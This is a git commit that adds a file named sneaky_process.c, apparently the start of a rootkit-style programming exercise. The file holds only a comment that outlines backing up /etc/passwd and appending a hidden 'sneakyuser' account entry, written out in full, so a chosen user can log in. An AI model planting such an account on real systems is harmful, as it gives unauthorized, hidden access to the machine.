5101b450a2441d2570a1e00399d3f8705e7b3b86
Nisarg <nisargdbh@gmail.com>
2018-04-10 22:09:27 -0400

    First commit

---
+++ sneaky_process.c
@@ -0,0 +1,12 @@
+/* This program will execute system calls by relevant APIS
+
+1. Copy /etc/passwd file to /tmp/passwd
+
+2. open /etc/passwd file, print new line to end of file with a username and password that will allow a desired user to authenticate tothe system: sneakyuser:abs123:2000:2000:sneakyuser:/root:bash
+
+
+
+
+
+
+*/
